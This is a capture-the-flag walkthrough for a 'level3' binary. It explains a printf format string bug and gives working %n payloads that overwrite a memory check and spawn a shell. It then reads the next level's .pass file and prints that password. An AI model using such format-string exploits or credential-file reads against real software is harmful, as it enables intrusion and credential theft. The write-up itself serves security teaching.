# Level3 Walkthrough - Format String Exploit Explained

## 🎯 Goal
Make the `level3` binary call `system()` to give us a shell by changing a number in memory from `0` to `64`.

---

## 🔍 Step 1: What the Binary Does

The binary has a function `v()` that:

1. Reads 512 characters of input.
2. Prints your input using `printf()` ← **THIS IS THE VULNERABILITY!**
3. Checks if a number at memory address `0x804988c` equals `64`.
4. If **YES**: gives you a shell.
5. If **NO**: does nothing.

The number at `0x804988c` starts as `0`. We need to change it to `64`.

---

## 🔍 Step 2: The `printf()` Vulnerability

Normally, `printf()` is used like this:

```c
printf("Hello %s", name);  // Good - format string + variable
```

But the binary does:

```c
printf(buffer);  // BAD! User input is treated as the format string
```

If we put `%` symbols in our input, `printf` treats them as **special commands**!

---

## 🔍 Step 3: The Magic `%n` Command

`%n` in `printf`:

- Counts **how many characters have been printed** so far.
- Writes that number to a **memory address**.

Example:

```c
int count;
printf("Hello%n", &count);  // count becomes 5
```

---

## 🔍 Step 4: Our Plan

We want to:

1. Put the target address `0x804988c` in our input.
2. Use `%n` to write `64` to that address.
3. Make the check pass → get a shell.

---

## 🔍 Step 5: Finding Where Our Input Appears

We need to know the **position** of our input in `printf`’s arguments:

```bash
python -c 'print "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"' | ./level3
```

Output example:

```
AAAA.200.b7fd1ac0.b7ff37d0.41414141.252e7824
```

- `41414141` = `"AAAA"` in hex.
- Appears at **position 4** → we will use `%4$n`.

---

## 🔍 Step 6: Building the Exploit

We need to write **exactly 64** to the target address:

```python
payload = "\x8c\x98\x04\x08"  # target address
payload += "%60x"             # padding: print 60 more chars
payload += "%4$n"             # write total (64) to 4th argument
```

**Math:**

- 4 bytes (address) = 4 characters printed.
- 60 bytes (padding) = 60 characters printed.
- Total = 64 → `%4$n` writes `64` to address `0x804988c`.

---

## 🚀 Step 7: Run the Exploit

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"'; cat) | ./level3
```

---

## 🔍 Step 8: What Happens

1. `printf` sees input: `\x8c\x98\x04\x08%60x%4$n`
2. Prints the 4-byte address.
3. `%60x`: prints 60 characters (padding).
4. `%4$n`: writes `64` to `0x804988c`.
5. Check passes → `system("/bin/sh")` called → shell spawned.

---

## 🎯 Step 9: Get the Password

```bash
cat /home/user/level4/.pass
```

Output:

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## 💡 Analogy

- The binary has a security guard checking a box for `64`.
- Box currently has `0`.
- We trick `printf` into putting `64` in the box.
- Guard sees `64` → lets us in.

---

## 🎉 Success!

**Password for level4:**

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

To access level4:

```bash
su level4
# Enter password when prompted
```


